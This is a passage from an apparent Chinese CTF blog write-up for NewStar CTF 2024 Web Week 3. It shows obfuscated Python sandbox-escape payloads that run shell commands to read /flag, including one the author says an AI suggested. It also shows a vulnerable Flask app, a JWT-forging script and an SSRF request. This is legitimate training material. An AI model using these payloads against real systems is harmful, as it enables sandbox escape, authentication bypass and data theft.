class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;𝑪&#x27;</span>, <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;𝑫&#x27;</span>, <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;𝑬&#x27;</span>, <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;𝑭&#x27;</span>, <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;𝑮&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;𝑯&#x27;</span>, <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;𝑰&#x27;</span>, <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;𝑱&#x27;</span>, <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;𝑲&#x27;</span>, <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;𝑳&#x27;</span>, <span class="string">&#x27;M&#x27;</span>: <span class="string">&#x27;𝑴&#x27;</span>, <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;𝑵&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;𝑶&#x27;</span>, <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;𝑷&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;𝑸&#x27;</span>, <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;𝑹&#x27;</span>, <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;𝑺&#x27;</span>, <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;𝑻&#x27;</span>, <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;𝑼&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;𝑽&#x27;</span>, <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;𝑾&#x27;</span>, <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;𝑿&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;𝒀&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;𝒁&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_italic</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将普通字母转换为数学斜体&quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> italic_map:</span><br><span class="line">            result.append(italic_map[char])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)  <span class="comment"># 非字母字符保持不变</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&quot;请输入要转换为斜体的英文文本: &quot;</span>)</span><br><span class="line">    italic_text = convert_to_italic(user_input)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;转换结果:&quot;</span>, italic_text)</span><br></pre></td></tr></table></figure>
+
+<p>__<em>＿ｉｍｐｏｒｔ</em>＿(ｃｈｒ(111)+ｃｈｒ(115)).</p>
+<p>𝒄𝒉𝒓(115)+𝒄𝒉𝒓(121)+𝒄𝒉𝒓(115)+𝒄𝒉𝒓(116)+𝒄𝒉𝒓(101)+𝒄𝒉𝒓(109)</p>
+<p>再专门写个脚本吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;system&quot;</span></span><br><span class="line">charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line">new_s = []</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">    new_s.append(<span class="string">f&quot;𝒄𝒉𝒓(<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 + 连接所有部分</span></span><br><span class="line">result = <span class="string">&quot;+&quot;</span>.join(new_s)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出拼接后的表达式</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_＿𝒊𝒎𝒑𝒐𝒓𝒕_＿(𝒄𝒉𝒓(111)+𝒄𝒉𝒓(115)).𝒔𝒚𝒔𝒕𝒆𝒎(𝒄𝒉𝒓(108)+𝒄𝒉𝒓(115)+𝒄𝒉𝒓(32)+𝒄𝒉𝒓(47))</span><br><span class="line">_＿𝒊𝒎𝒑𝒐𝒓𝒕_＿(𝒄𝒉𝒓(111)+𝒄𝒉𝒓(115)).𝒔𝒚𝒔𝒕𝒆𝒎(𝒄𝒉𝒓(99)+𝒄𝒉𝒓(97)+𝒄𝒉𝒓(116)+𝒄𝒉𝒓(32)+𝒄𝒉𝒓(47)+𝒄𝒉𝒓(102)+𝒄𝒉𝒓(108)+𝒄𝒉𝒓(97)+𝒄𝒉𝒓(103))</span><br></pre></td></tr></table></figure>
+
+<h3 id="臭皮踩踩背"><a href="#臭皮踩踩背" class="headerlink" title="臭皮踩踩背"></a>臭皮踩踩背</h3><p>这题是用nc连接的，</p>
+<p>只有部分代码显示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">	nc 127.0.0.1 48254</span><br><span class="line">你被豌豆关在一个监狱里，，，，，，</span><br><span class="line">豌豆百密一疏，不小心遗漏了一些东西，，，</span><br><span class="line">def ev4l(*args):</span><br><span class="line">        print(secret)</span><br><span class="line">inp = input(&quot;&gt; &quot;)</span><br><span class="line">f = lambda: None</span><br><span class="line">print(eval(inp, &#123;&quot;__builtins__&quot;: None, &#x27;f&#x27;: f, &#x27;eval&#x27;: ev4l&#125;))</span><br><span class="line">能不能逃出去给豌豆踩踩背就看你自己了，臭皮，，</span><br></pre></td></tr></table></figure>
+
+<p>官方对eval的解释<a target="_blank" rel="noopener" href="https://docs.python.org/3.10/library/functions.html#eval">https://docs.python.org/3.10/library/functions.html#eval</a></p>
+<p>具体不是很会</p>
+<p><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/14?challenge=620&tab=answer">https://ctf.xidian.edu.cn/training/14?challenge=620&amp;tab=answer</a></p>
+<p><strong>Python 中「一切皆对象」</strong></p>
+<p>利用函数对象的 <code>__globals__</code> 属性来逃逸</p>
+<p>具体不会</p>
+<p>但问ai，ai说用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.__globals__[&#x27;__builtins__&#x27;].__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<h3 id="这「照片」是你吗"><a href="#这「照片」是你吗" class="headerlink" title="这「照片」是你吗"></a>这「照片」是你吗</h3><p>打开网页里面就有</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 图标能够正常显示耶! --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以很明显要进行目录穿越，而浏览器会把..&#x2F;给去掉，所以我们需要一个发包软件，fuzz之后发现app.py有内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, render_template_string, request, redirect, send_file</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> get_random_number_string</span><br><span class="line"></span><br><span class="line">base_key = <span class="built_in">str</span>(uuid.uuid4()).split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">secret_key = get_random_number_string(<span class="number">6</span>)</span><br><span class="line">admin_pass = <span class="string">&quot;&quot;</span>.join([ _ <span class="keyword">for</span> _ <span class="keyword">in</span> base_key])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(admin_pass)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">failure_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: admin_pass,</span><br><span class="line">    <span class="string">&#x27;amiya&#x27;</span>: <span class="string">&quot;114514&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_token</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">global</span> failure_count</span><br><span class="line">        <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">        data = jwt.decode(token, secret_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> data.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            failure_count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You are not admin!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">401</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/home&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">global</span> failure_count</span><br><span class="line">    <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> users.get(username)==password:</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;user&#x27;</span>: username, <span class="string">&#x27;exp&#x27;</span>: <span class="built_in">int</span>(time.time()) + <span class="number">600</span>&#125;, secret_key)</span><br><span class="line">        response = make_response(<span class="string">&#x27;Login success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        failure_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&#x27;Could not verify!&lt;br&gt;&lt;img src=&quot;/3.png&quot;&gt;&#x27;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = make_response(<span class="string">&#x27;Logout success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expires=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    logged_in = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        data = jwt.decode(token, secret_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        text = <span class="string">&quot;Hello, %s!&quot;</span> % data.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        logged_in = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        logged_in = <span class="literal">False</span></span><br><span class="line">        text = <span class="string">&quot;You have not logged in!&quot;</span></span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Home Page&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 图标能够正常显示耶! --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; text &#125;&#125;&lt;br&gt;</span></span><br><span class="line"><span class="string">            &#123;% if logged_in %&#125;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot;&gt;登出&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &#123;% else %&#125;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;登录&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                用户名: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                密码: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &#123;% if user==&quot;admin&quot; %&#125;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/admin&quot;&gt;Go to admin panel&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;/2.png&quot;&gt;</span></span><br><span class="line"><span class="string">            &#123;% else %&#125;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;/1.png&quot;&gt;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, text=text, logged_in=logged_in, user=data.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> verify_token(token)</span><br><span class="line">        resp_text = render_template_string(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;</span></span><br><span class="line"><span class="string">                &lt;title&gt;Admin Panel&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;body&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Admin Panel&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;GET Server Info from api:&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;input&quot; value=&#123;&#123;api_url&#125;&#125; id=&quot;api&quot; readonly&gt;</span></span><br><span class="line"><span class="string">                &lt;button onclick=execute()&gt;Execute&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;script&gt;</span></span><br><span class="line"><span class="string">                    function execute() &#123;</span></span><br><span class="line"><span class="string">                        fetch(&quot;&#123;&#123;url&#125;&#125;/execute?api_address=&quot;+document.getElementById(&quot;api&quot;).value,</span></span><br><span class="line"><span class="string">                                      &#123;credentials: &quot;include&quot;&#125;</span></span><br><span class="line"><span class="string">                                      ).then(res =&gt; res.text()).then(data =&gt; &#123;</span></span><br><span class="line"><span class="string">                            document.write(data);</span></span><br><span class="line"><span class="string">                        &#125;);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &lt;/script&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>, api_url=request.host_url+<span class="string">&quot;/api&quot;</span>, url=request.host_url)</span><br><span class="line">        resp = make_response(resp_text)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/execute&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> verify_token(token)</span><br><span class="line">    api_address = request.args.get(<span class="string">&quot;api_address&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> api_address:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;No api address!&quot;</span>, <span class="number">400</span>)</span><br><span class="line">    response = requests.get(api_address, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> verify_token(token)</span><br><span class="line">    resp = make_response(<span class="string">f&quot;Server Info: <span class="subst">&#123;os.popen(<span class="string">&#x27;uname -a&#x27;</span>).read()&#125;</span>&quot;</span>)</span><br><span class="line">    resp.headers[<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:file&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static_file</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="built_in">print</span>(file)</span><br><span class="line">    restricted_keywords = [<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;etc&quot;</span>, </span><br><span class="line">                           <span class="string">&quot;bin&quot;</span>, <span class="string">&quot;lib&quot;</span>, <span class="string">&quot;tmp&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;dev&quot;</span>, <span class="string">&quot;home&quot;</span>, <span class="string">&quot;boot&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> file <span class="keyword">for</span> keyword <span class="keyword">in</span> restricted_keywords):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;STOP!&quot;</span>, <span class="number">404</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;./static/&quot;</span> + file):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Not found!&quot;</span>, <span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&quot;./static/&quot;</span> + file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>代码审计题，发现造jwt的密钥是六位数字，所以对它进行爆破，发现密码787064，写脚本造cookie</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">secret_key=<span class="string">&quot;787064&quot;</span></span><br><span class="line">fake_token = jwt.encode(&#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>: <span class="built_in">int</span>(time.time()) + <span class="number">600</span>&#125;, secret_key)</span><br><span class="line"><span class="built_in">print</span>(fake_token)</span><br></pre></td></tr></table></figure>
+
+<p>然后使用execute中的ssrf漏洞读取内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:48254/execute?api_address=http://localhost:5001/fl4g</span><br></pre></td></tr></table></figure>
+
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://huajihd.github.io">Huaji</a>
+            <p>原文链接：<a href="http://huajihd.github.io/2025/07/20/NewStar-CTF-2024-Web-Week3/">http://huajihd.github.io/2025/07/20/NewStar-CTF-2024-Web-Week3/</a>
+            <p>发表日期：<a href="http://huajihd.github.io/2025/07/20/NewStar-CTF-2024-Web-Week3/">July 20th 2025, 12:12:49 am</a>
+            <p>更新日期：<a href="http://huajihd.github.io/2025/07/20/NewStar-CTF-2024-Web-Week3/">July 20th 2025, 12:13:38 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/08/11/fengshentai/" title="封神台2025">
+                    <div class="nextTitle">封神台2025</div>
+                </a>
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/07/20/NewStar-CTF-2024-Web-Week2/" title="NewStar CTF 2024 Web Week2复现">
